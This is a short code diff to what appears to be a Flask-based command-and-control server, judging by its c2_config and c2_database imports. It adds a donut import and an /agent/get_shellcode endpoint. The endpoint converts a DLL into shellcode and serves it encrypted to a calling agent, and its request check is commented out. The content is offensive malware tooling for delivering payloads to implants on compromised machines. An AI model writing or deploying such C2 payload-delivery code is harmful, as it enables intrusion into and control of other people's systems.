@@ -5,6 +5,7 @@
 from c2_config import *
 from c2_database import *
 from aesgcm import *
+import donut
 
 
 @login_manager.user_loader
@@ -150,3 +151,13 @@ def send_results():
     task.job_status = DONE
     db.session.commit()
     return encrypt_data({"status": "ok"})
+
+@app.route('/agent/get_shellcode', methods=['GET'])
+def get_shellcode():
+    # data = decrypt_data(request.data)
+    # if data == None:
+    #     return encrypt_data({"status": "no data"})
+    shellcode = donut.create(file="test.dll", method="IAmAGoodNoodle")
+    return encrypt_shellcode(shellcode)
+
+    
